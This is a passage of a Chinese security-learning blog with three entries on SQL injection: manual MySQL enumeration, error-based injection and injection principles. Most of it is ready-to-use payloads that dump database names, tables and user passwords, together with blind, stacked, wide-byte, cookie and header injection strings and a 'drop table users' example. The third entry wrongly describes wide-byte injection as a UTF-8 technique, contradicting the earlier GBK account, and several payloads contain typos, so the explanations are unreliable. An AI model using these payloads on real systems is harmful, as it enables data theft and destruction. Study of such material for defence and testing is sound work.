class="headerlink" title="手工注入"></a>手工注入</h1><p>要从select语句中获得有用的信息，必须确定该数据库中的字段数和那个字段能够输出，这是前提。</p><h2 id="MySQL-5-0"><a href="#MySQL-5-0" class="headerlink" title="MySQL &gt;&#x3D; 5.0"></a>MySQL &gt;&#x3D; 5.0</h2><h3 id="获取字段数"><a href="#获取字段数" class="headerlink" title="获取字段数"></a>获取字段数</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">order by n /*通过不断尝试改变n的值来观察页面反应确定字段数*/</span><br></pre></td></tr></table></figure><h3 id="获取系统数据库名"><a href="#获取系统数据库名" class="headerlink" title="获取系统数据库名"></a>获取系统数据库名</h3><p>在MySQL &gt;5.0中，数据库名存放在information_schema数据库下schemata表schema_name字段中</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select 1,2,schema_name from information_schema.schemata</span><br></pre></td></tr></table></figure><h3 id="获取当前数据库名"><a href="#获取当前数据库名" class="headerlink" title="获取当前数据库名"></a>获取当前数据库名</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select 1,2,...,database()</span><br></pre></td></tr></table></figure><h3 id="获取数据库中的表"><a href="#获取数据库中的表" class="headerlink" title="获取数据库中的表"></a>获取数据库中的表</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select <span class="number">1</span>,<span class="number">2</span>,...,<span class="title function_ invoke__">group_concat</span>(table_name) <span class="keyword">from</span> information_schema.tables where table_schema=<span class="title function_ invoke__">database</span>()</span><br></pre></td></tr></table></figure><p>或者</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select 1,2,...,table_name from information_schema.tables where table_schema=database() limit 0,1</span><br></pre></td></tr></table></figure><h3 id="获取表中的字段"><a href="#获取表中的字段" class="headerlink" title="获取表中的字段"></a>获取表中的字段</h3><p>这里假设已经获取到表名为user</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select 1,2,...,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27;</span><br></pre></td></tr></table></figure><h3 id="获取各个字段值"><a href="#获取各个字段值" class="headerlink" title="获取各个字段值"></a>获取各个字段值</h3><p>这里假设已经获取到表名为user，且字段为username和password</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select 1,group_concat(username,password) from users</span><br></pre></td></tr></table></figure><h2 id="MySQL-5-0-1"><a href="#MySQL-5-0-1" class="headerlink" title="MySQL &lt; 5.0"></a>MySQL &lt; 5.0</h2><p>MySQL &lt; 5.0 没有信息数据库information_schema，所以只能手工枚举爆破（二分法思想）。</p><p>该方式通常用于盲注。</p><p><strong>相关函数</strong></p><p><code>length(str)</code> ：返回字符串str的长度</p><p><code>substr(str, pos, len)</code> ：将str从pos位置开始截取len长度的字符进行返回。注意这里的pos位置是从1开始的，不是数组的0开始</p><p><code>mid(str,pos,len)</code> ：跟上面的一样，截取字符串</p><p><code>ascii(str)</code> ：返回字符串str的最左面字符的ASCII代码值</p><p><code>ord(str)</code> ：将字符或布尔类型转成ascll码</p><p><code>if(a,b,c)</code> ：a为条件，a为true，返回b，否则返回c，如if(1&gt;2,1,0),返回0</p><p>基于布尔的盲注</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and ascii(substr((select database()),1,1))&gt;64 /*判断数据库名的第一个字符的ascii值是否大于64*/</span><br></pre></td></tr></table></figure><p>基于时间的盲注</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=<span class="number">1</span> union select <span class="keyword">if</span>(<span class="title function_ invoke__">SUBSTRING</span>(<span class="title function_ invoke__">user</span>(),<span class="number">1</span>,<span class="number">4</span>)=<span class="string">&#x27;root&#x27;</span>,<span class="title function_ invoke__">sleep</span>(<span class="number">4</span>),<span class="number">1</span>),<span class="literal">null</span>,<span class="literal">null</span> <span class="comment">/*提取用户名前四个字符做判断，正确就延迟4秒，错误返回1*/</span></span><br></pre></td></tr></table></figure><h1 id="常用注入方式"><a href="#常用注入方式" class="headerlink" title="常用注入方式"></a>常用注入方式</h1><h2 id="注释符"><a href="#注释符" class="headerlink" title="注释符"></a>注释符</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">-- 注释内容</span><br><span class="line"># 注释内容</span><br><span class="line">/*注释内容*/</span><br><span class="line">;</span><br><span class="line">;%00</span><br><span class="line">%23</span><br><span class="line">` 单行或者多行注释（别名）</span><br><span class="line">// 单行或者多行注释</span><br></pre></td></tr></table></figure><p>实例</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from users -- where id = 1;</span><br><span class="line">    -&gt; ;</span><br><span class="line">+----+----------+----------+</span><br><span class="line">| id | username | password |</span><br><span class="line">+----+----------+----------+</span><br><span class="line">|  1 | test1    | pass     |</span><br><span class="line">|  2 | user2    | pass1    |</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from users # where id = 2;</span><br><span class="line">    -&gt; ;</span><br><span class="line">+----+----------+----------+</span><br><span class="line">| id | username | password |</span><br><span class="line">+----+----------+----------+</span><br><span class="line">|  1 | test1    | pass     |</span><br><span class="line">|  2 | user2    | pass1    |</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from users where id = 3 /*+1*/</span><br><span class="line">    -&gt; ;</span><br><span class="line">+----+----------+----------+</span><br><span class="line">| id | username | password |</span><br><span class="line">+----+----------+----------+</span><br><span class="line">|  3 | test3    | pass1    |</span><br><span class="line">+----+----------+----------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure><h2 id="union注入"><a href="#union注入" class="headerlink" title="union注入"></a>union注入</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id =-1 union select 1,2,3/*获取字段*/</span><br></pre></td></tr></table></figure><h2 id="Boolean注入"><a href="#Boolean注入" class="headerlink" title="Boolean注入"></a>Boolean注入</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1&#x27; substr(database(),1,1)=&#x27;t&#x27;--+/*判断数据名长度*/</span><br></pre></td></tr></table></figure><h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><p>floor()和rand()</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union select count(*),2,concat(&#x27;:&#x27;,(select database()),&#x27;:&#x27;,floor(rand()*2))as a from information_schema.tables group by a/*利用错误信息得到当前数据库名*/</span><br></pre></td></tr></table></figure><p>extractvalue()</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1 and (extractvalue(1,concat(0x7e,(select user()),0x7e)))</span><br></pre></td></tr></table></figure><p>updatexml()</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1 and (updatexml(1,concat(0x7e,(select user()),0x7e),1))</span><br></pre></td></tr></table></figure><p>geometrycollection()</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1 and geometrycollection((select * from(select * from(select user())a)b))</span><br></pre></td></tr></table></figure><p>multipoint()</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1 and multipoint((select * from(select * from(select user())a)b))</span><br></pre></td></tr></table></figure><p>polygon()</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1 and polygon((select * from(select * from(select user())a)b))</span><br></pre></td></tr></table></figure><p>multipolygon()</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1 and multipolygon((select * from(select * from(select user())a)b))</span><br></pre></td></tr></table></figure><p>linestring()</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1 and linestring((select * from(select * from(select user())a)b))</span><br></pre></td></tr></table></figure><p>multilinestring()</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1 and multilinestring((select * from(select * from(select user())a)b))</span><br></pre></td></tr></table></figure><p>exp()</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1 and exp(~(select * from(select user())a))</span><br></pre></td></tr></table></figure><h3 id="时间注入"><a href="#时间注入" class="headerlink" title="时间注入"></a>时间注入</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id = 1 and if(length(database())&gt;1,sleep(5),1)</span><br></pre></td></tr></table></figure><h3 id="堆叠查询注入"><a href="#堆叠查询注入" class="headerlink" title="堆叠查询注入"></a>堆叠查询注入</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id = 1&#x27;;select if(sub(user(),1,1)=&#x27;r&#x27;,sleep(3),1)%23</span><br></pre></td></tr></table></figure><h3 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h3><p>假如在如下场景中，我们浏览一些网站的时候，可以现在注册见页面注册username&#x3D;test’，接下来访问xxx.php?username&#x3D;test’，页面返回id&#x3D;22；</p><p>接下来再次发起请求xxx.php?id&#x3D;22，这时候就有可能发生sql注入，比如页面会返回MySQL的错误。</p><p>访问xxx.php?id&#x3D;test’ union select 1,user(),3%23，获得新的id&#x3D;40，得到user()的结果，利用这种注入方式会得到数据库中的值。</p><h3 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h3><p>利用条件：</p><p>查询参数是被单引号包围的，传入的单引号又被转义符()转义，如在后台数据库中对接受的参数使用addslashes()或其过滤函数<br>数据库的编码为GBK</p><p>利用方式</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id = -1%DF&#x27; union select 1,user(),3,%23</span><br></pre></td></tr></table></figure><p>在上述条件下，单引号’被转义为%5c，所以就构成了%df%5c，而在GBK编码方式下，%df%5c是一个繁体字“連”，所以单引号成功逃逸。</p><h3 id="Cookie注入"><a href="#Cookie注入" class="headerlink" title="Cookie注入"></a>Cookie注入</h3><p>当发现在url中没有请求参数，单数却能得到结果的时候，可以看看请求参数是不是在cookie中，然后利用常规注入方式在cookie中注入测试即可，只是注入的位置在cookie中，与url中的注入没有区别。</p><p>Cookie: id &#x3D; 1 and 1&#x3D;1</p><h3 id="base64注入"><a href="#base64注入" class="headerlink" title="base64注入"></a>base64注入</h3><p>对参数进行base64编码，再发送请求。</p><p>说明：id&#x3D;1’，1的base64编码为MSc&#x3D;，而&#x3D;的url编码为%3d，所以得到以下结果：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=MSc%3d</span><br></pre></td></tr></table></figure><h3 id="XFF注入"><a href="#XFF注入" class="headerlink" title="XFF注入"></a>XFF注入</h3><p>XFF(X-Forward-For)，简称XFF头，它代表客户端真实的ip地址</p><p>X-Forward-For：127.0.0.1’ select 1,2,user()</p><h1 id="sql注入绕过"><a href="#sql注入绕过" class="headerlink" title="sql注入绕过"></a>sql注入绕过</h1><p>篇幅过长，放<a href="https://www.loongten.com/2019/12/28/pentest-learn-sql-bypass">另外一篇</a>了</p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p>百度百科</p><p>原文作者：<a href="http://www.loongten.com/">keacwu</a></p><p>原文链接：<a href="http://www.loongten.com/2019/12/28/pentest-learn-sql/">http://www.loongten.com/2019/12/28/pentest-learn-sql/</a></p><p>发表日期：<a href="http://www.loongten.com/2019/12/28/pentest-learn-sql/">December 28th 2019, 11:03:58 am</a></p><p>更新日期：<a href="http://www.loongten.com/2019/12/28/pentest-learn-sql/">December 28th 2019, 7:31:59 pm</a></p><p>版权声明：本文采用<a href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>]]></content>
      
      
      <categories>
          
          <category> SQL </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQL </tag>
            
            <tag> 数据库 - 渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQL报错注入</title>
      <link href="/2023/11/30/13.SQL%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/"/>
      <url>/2023/11/30/13.SQL%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><p>报错注入在没法用union联合查询时用，但前提还是不能过滤一些关键的函数。</p><p>报错注入就是利用了数据库的某些机制，人为地制造错误条件，使得查询结果能够出现在错误信息中。这里主要记录一下<code>xpath语法错误</code>和<code>concat+rand()+group_by()导致主键重复</code></p><h2 id="xpath语法错误"><a href="#xpath语法错误" class="headerlink" title="xpath语法错误"></a>xpath语法错误</h2><p>利用xpath语法错误来进行报错注入主要利用<code>extractvalue</code>和<code>updatexml</code>两个函数。<br>使用条件：mysql版本&gt;5.1.5</p><h6 id="extractvalue函数"><a href="#extractvalue函数" class="headerlink" title="extractvalue函数"></a>extractvalue函数</h6><blockquote><p>函数原型：extractvalue(xml_document,Xpath_string)<br>正常语法：extractvalue(xml_document,Xpath_string);<br>第一个参数：xml_document是string格式，为xml文档对象的名称<br>第二个参数：Xpath_string是xpath格式的字符串<br>作用：从目标xml中返回包含所查询值的字符串</p></blockquote><p>第二个参数是要求符合xpath语法的字符串，如果不满足要求，则会报错，并且将查询结果放在报错信息里，因此可以利用。</p><p>pyload：<code>id=&#39;and(select extractvalue(&quot;anything&quot;,concat(&#39;~&#39;,(select语句))))</code></p><p>例如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">id=&#x27;and(select extractvalue(1,concat(&#x27;~&#x27;,(select database()))))</span><br><span class="line">id=&#x27;and(select extractvalue(1,concat(0x7e,@@version)))</span><br></pre></td></tr></table></figure><p>针对mysql数据库：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">查数据库名：id=&#x27;and(select extractvalue(1,concat(0x7e,(select database()))))</span><br><span class="line">爆表名：id=&#x27;and(select extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()))))</span><br><span class="line">爆字段名：id=&#x27;and(select extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&quot;TABLE_NAME&quot;))))</span><br><span class="line">爆数据：id=&#x27;and(select extractvalue(1,concat(0x7e,(select group_concat(COIUMN_NAME) from TABLE_NAME))))</span><br></pre></td></tr></table></figure><p>注：</p><ul><li>① 0x7e&#x3D;’~’</li><li>② concat(‘a’,‘b’)&#x3D;“ab”</li><li>③ version()&#x3D;@@version</li><li>④ ‘~‘可以换成’#’、’$’等不满足xpath格式的字符</li><li>⑤ extractvalue()能查询字符串的最大长度为32，如果我们想要的结果超过32，就要用substring()函数截取或limit分页，一次查看最多32位</li></ul><h6 id="updatexml"><a href="#updatexml" class="headerlink" title="updatexml"></a>updatexml</h6><blockquote><p>函数原型：updatexml(xml_document,xpath_string,new_value)<br>正常语法：updatexml(xml_document,xpath_string,new_value)<br>第一个参数：xml_document是string格式，为xml文档对象的名称 第二个参数：xpath_string是xpath格式的字符串<br>第三个参数：new_value是string格式，替换查找到的负荷条件的数据 作用：改变文档中符合条件的节点的值</p></blockquote><p>第二个参数跟extractvalue函数的第二个参数一样，因此也可以利用，且利用方式相同<br>payload：<code>id=&#39;and(select updatexml(&quot;anything&quot;,concat(&#39;~&#39;,(select语句())),&quot;anything&quot;))</code></p><p>例如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x27;and(select updatexml(1,concat(&#x27;~&#x27;,(select database())),1))</span><br><span class="line">&#x27;and(select updatexml(1,concat(0x7e,@@database),1))</span><br></pre></td></tr></table></figure><p>同样，针对mysql：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">爆数据库名：&#x27;and(select updatexml(1,concat(0x7e,(select database())),0x7e))</span><br><span class="line">爆表名：&#x27;and(select updatexml(1,concat(0x7e,(select group_concat(table_name)from information_schema.tables where table_schema=database())),0x7e))</span><br><span class="line">爆列名：&#x27;and(select updatexml(1,concat(0x7e,(select group_concat(column_name)from information_schema.columns where table_name=&quot;TABLE_NAME&quot;)),0x7e))</span><br><span class="line">爆数据：&#x27;and(select updatexml(1,concat(0x7e,(select group_concat(COLUMN_NAME)from TABLE_NAME)),0x7e))</span><br></pre></td></tr></table></figure><h2 id="concat-rand-group-by-导致主键重复"><a href="#concat-rand-group-by-导致主键重复" class="headerlink" title="concat+rand()+group_by()导致主键重复"></a>concat+rand()+group_by()导致主键重复</h2><p>这种报错方法的本质是因为floor(rand(0)*2)的重复性，导致group by语句出错。group by key的原理是循环读取数据的每一行，将结果保存于临时表中。读取每一行的key时，如果key存在于临时表中，则不在临时表中更新临时表的数据；如果key不在临时表中，则在临时表中插入key所在行的数据。</p><p><strong>rand()：</strong></p><blockquote><p>生成0~1之间的随机数，可以给定一个随机数的种子，对于每一个给定的种子，rand()函数都会产生一系列可以复现的数字</p></blockquote><p><strong>floor()：</strong></p><blockquote><p>对任意正或者负的十进制值向下取整</p></blockquote><p>通常利用这两个函数的方法是<code>floor(rand(0))*2</code> ,其会生成0和1两个数</p><p><strong>group by</strong></p><blockquote><p>group by是根据一个或多个列对结果集进行分组的sql语句，其用法为：<br>SELECT column_name, aggregate_function(column_name)<br>FROM table_name<br>WHERE column_name operator value<br>GROUP BY column_name</p></blockquote><p>常见的payload为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;union select 1 from (select count(*),concat((slelect语句),floor(rand(0)*2))x from &quot;一个足大的表&quot; group by x)a--+</span><br></pre></td></tr></table></figure><p>例如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#x27;union select 1 from (select count(*),concat((select user()),floor(rand(0)*2))x from information_schema.tables group by x)a--+</span><br><span class="line"></span><br><span class="line">利用information_schema.tables表，相似的还可以用information_schema.columns等</span><br></pre></td></tr></table></figure><p>为了使结构能够更方便的查看，可以在concat()中添加一些内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;union select 1 from (select count(*),concat((select user()),&quot; &quot;,floor(rand(0)*2))x from information_schema.tables group by x)a</span><br></pre></td></tr></table></figure><p>之后还是将select语句改为一般的注入语句就可以：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">爆数据库名：&#x27;union select 1 from (select count(*),concat((select database()),&quot; &quot;,floor(rand(0)*2))x from information_schema.tables group by x)a</span><br><span class="line">爆表名：&#x27;union select 1 from (select count(*),concat((select table_name from information_schema.tables where table_schema=database() limit 0,1) ,&quot; &quot;,floor(rand(0)*2))x from information_schema.tables group by x)a</span><br><span class="line">爆列名：&#x27;union select 1 from (select count(*),concat((select column_name from information_schema.columns where table_name=&quot;TABLE_NAME&quot; limit 0,1) ,&quot; &quot;,floor(rand(0)*2))x from information_schema.tables group by x)a</span><br><span class="line">爆数据：&#x27;union select 1 from (select count(*),concat((select COLUMN_NAME from TABLE_NAME limit 0,1) ,&quot; &quot;,floor(rand(0)*2))x from information_schema.tables group by x)a</span><br></pre></td></tr></table></figure><p>不能使用group_concat函数，所以用limit语句来限制查询结果的列数</p><h3 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h3><p><a href="https://xz.aliyun.com/t/253">https://xz.aliyun.com/t/253</a><br><a href="http://vinc.top/2017/03/23/%E3%80%90sql%E6%B3%A8%E5%85%A5%E3%80%91%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93/">http://vinc.top/2017/03/23/%E3%80%90sql%E6%B3%A8%E5%85%A5%E3%80%91%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93/</a><br><a href="http://lawlietweb.com/2017/11/12/error-base/">http://lawlietweb.com/2017/11/12/error-base/</a></p>]]></content>
      
      
      <categories>
          
          <category> SQL </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQL </tag>
            
            <tag> 数据库 - 渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQL注入原理</title>
      <link href="/2023/11/30/12.SQl%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86/"/>
      <url>/2023/11/30/12.SQl%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86/</url>
      
        <content type="html"><![CDATA[<h3 id="一、原理"><a href="#一、原理" class="headerlink" title="一、原理"></a>一、原理</h3><p>SQL注入的原理很简单,就是利用网站后台数据库的漏洞,注入恶意的SQL语句。</p><p>具体来说,主要有以下几个方面:</p><ol><li><p>网站没有对用户输入进行妥善的过滤和清理,允许包含特殊SQL字符如’;&#x2F;</p></li><li><p>网站直接将用户的输入作为SQL查询语句的一部分,而没有做安全预处理。</p></li><li><p>攻击者通过往表单或URL中注入恶意的SQL语句,利用上述漏洞执行攻击。</p></li><li><p>成功注入后,攻击者可以修改或提取数据库中的数据,或者执行其他有害操作。</p></li></ol><p>举个例子:</p><p>正常的SQL语句可能是:</p><p><code>select * from users where name = &#39;$name&#39;;</code></p><p>$name 是从用户输入中获取的。</p><p>如果用户输入:</p><p><code>test&#39;); drop table users; --</code></p><p>则最终的SQL语句会变成:</p><p><code>select * from users where name = &#39;test&#39;); drop table users; --&#39;</code></p><p>导致users表被删除。</p><p>通过这种方式,攻击者就可以注入任意SQL语句,造成严重后果。</p><p>所以,SQL注入的原理就是:</p><ol><li><p>通过利用网站没有对用户输入进行足够过滤和清理,</p></li><li><p>将含有特殊SQL字符的字符串注入SQL语句中,</p></li><li><p>执行恶意的SQL操作,获取数据或造成破坏。</p></li></ol><p>总的来说, SQL注入利用的是网站应用程序中对用户输入再础安全检查上的不足,通过恶意SQL操作达到攻击目标。</p><p>可以通过妥善的过滤参数、使用安全预处理语句来防范SQL注入。</p><p>主要的SQL注入Payload有:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; or &#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure><p>检测是否存在SQL注入漏洞的基础Payload。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; or 1=1--</span><br></pre></td></tr></table></figure><p>注释后面的SQL语句,并返回真值。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; or &#x27;1&#x27;=&#x27;1&#x27; #</span><br></pre></td></tr></table></figure><p>使用#注释后面的SQL。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; or &#x27;1&#x27;=&#x27;1&#x27;/*</span><br></pre></td></tr></table></figure><p>使用&#x2F;*注释后面的SQL语句。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; or &#x27;1&#x27;=&#x27;1&#x27; and &#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure><p>复杂的逻辑判断语句。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; or 1=0 union select 1,2,3--</span><br></pre></td></tr></table></figure><p>尝试联合查询,列出数据库表结构。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; or 1=0 union select table_name from information_schema.tables --</span><br></pre></td></tr></table></figure><p>查询数据表名称。 </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; or 1=0 union select column_name from information_schema.columns where table_name=&#x27;users&#x27; --</span><br></pre></td></tr></table></figure><p>查询用户数据表的列名。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; or 1=0 union select 1,username,password from users --</span><br></pre></td></tr></table></figure><p>尝试列出用户信息。</p><p>除此之外,还有各种基于时间的Payload、存储过程注入Payload等,上述Payload主要用于初步检测SQL注入漏洞和获取基本信息。</p><p>每个Payload攻击目标的反应不同,最好编写一个Payloads列表,逐一测试应用程序的响应。</p><p>希望能为您提供参考!请谨防SQL注入攻击。</p><ol><li><h5 id="字符注入"><a href="#字符注入" class="headerlink" title="字符注入"></a>字符注入</h5><p>什么是SQL字符注入:</p><p>当用户的输入信息没有正确过滤并作为SQL查询语句的一部分时,攻击者就可以构造特殊格式的输入,最终修改原本SQL查询的结构,从而实现未授权获取数据或执行 undesirable 操作。</p><p>举个例子:</p><p>假设一个网站有一个用户登录表单,要求输入用户名和密码。我们的SQL查询可能是这样的:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM users WHERE name = &#x27;$name&#x27; AND password=&#x27;$password&#x27;;</span><br></pre></td></tr></table></figure><p>如果用户名为’admin’ ‘ OR ‘1’&#x3D;’1’,最终组成的SQL查询为:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM users WHERE name = &#x27;admin&#x27; &#x27; OR &#x27;1&#x27;=&#x27;1&#x27; AND password=&#x27;$password&#x27;;</span><br></pre></td></tr></table></figure><p>‘OR ‘1’&#x3D;’1’总是成立,所以所有用户都可以登录。</p><p>通过这种方法,攻击者可以获取其他用户的敏感信息,甚至读取数据库中所有表的数据。</p><p>这就是SQL字符注入的基本原理。</p></li><li><h5 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h5><p>宽字节注入(Unicode&#x2F;UTF-8注入)是一种SQL注入的变种。</p><p>与普通的SQL注入不同的是,宽字节注入利用UTF-8编码来注入攻击字符串,以 evade 输入过滤器。</p><p>具体来说:</p><ul><li><p>常规SQL注入使用ANSI字符集,过滤器可以很容易识别和过滤掉。</p></li><li><p>而宽字节注入使用UTF-8编码,可以构造出过滤器无法识别的多字节序列。</p></li><li><p>过滤器可能只检查ASCII范围内的字符,而忽略UTF-8多字节序列。</p></li></ul><p>因此,攻击者可以使用 UTF-8 编码的特殊字符来构造出过滤器无法识别的注入语句。</p><p>举个例子:</p><p>普通SQL注入语句:<br><code>&#39; or 1=1 --</code></p><p>宽字节注入语句:<br><code>\u0027 or 1=1 --</code></p><p>其中 \u0027 是 UTF-8 编码的单引号字符。</p><p>这样就可以evade简单的输入过滤,达到SQL注入的效果。</p><p>防护宽字节注入的方法是:</p><ul><li>使用白名单、黑名单,检查所有可能的UTF-8多字节序列</li><li>对所有输入执行decode和再encode,确保它是规范的UTF-8</li><li>对所有输入执行escape()函数来转义特殊字符</li><li>使用参数化查询,而不是组合SQL字符串</li></ul><p>总的来说,宽字节注入就是利用UTF-8编码构造出难以检测的注入攻击字符串,它属于SQL注入的变种。</p></li><li><h5 id="布尔注入"><a href="#布尔注入" class="headerlink" 